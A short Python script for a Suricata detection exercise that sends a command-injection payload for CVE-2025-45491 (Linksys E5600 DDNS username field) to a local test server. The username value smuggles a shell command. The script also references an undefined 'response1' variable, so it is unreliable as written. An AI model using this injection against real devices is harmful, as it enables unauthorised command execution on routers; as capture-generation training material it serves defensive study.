#CVE 2025-45491/2025-45488
#Linksys E5600 runtime.ddnsStatus Authenticated Command Injection Attempt
#This code is based on the original code recovered from the internet archive by the github user "JZP018".
#Specifically, the code here is modeled after CVE-2025-45491.py (username parameter injection)
#Use this code to follow along in Suricata: An Operator's Guide Chapter 8, Section 8.4
#Note: the CVEs above are AUTHENTICATED command injection attacks. 
#This "exploit" cannot successfully exploit an actual, vulnerable E5600. 
#This "exploit" exists only to demonstrate the vulnerability and record the attempt in a packet capture for further analysis.
#Note: this version of the exploit assumes the target IP address is 10.0.0.16 with the HTTP server on port 8000. You'll need to modify every instance of "10.0.0.16:8000" with the correct IP address and port you are using for your "exploit catcher" VM, running python's http.server module.
import requests
import json

url2 = 'http://10.0.0.16:8000/API/obj'
headers = {
    'Host': '192.168.31.6',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://10.0.0.16:8000',
    'Referer': 'http://10.0.0.16:8000/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data2 = {"ddns":{"DdnsP":{"enable":"1","username":"; `ls>/www/20250328.txt`; #","password":"admin","hostname":"admin","provider":"DynDNS.org","system":"0","mailex":"rweed","backupmailex":"1","wildcard":"1","ip":"","status":""}}}

response2 = requests.post(url2, headers=headers, data=json.dumps(data2))
print(response2.text)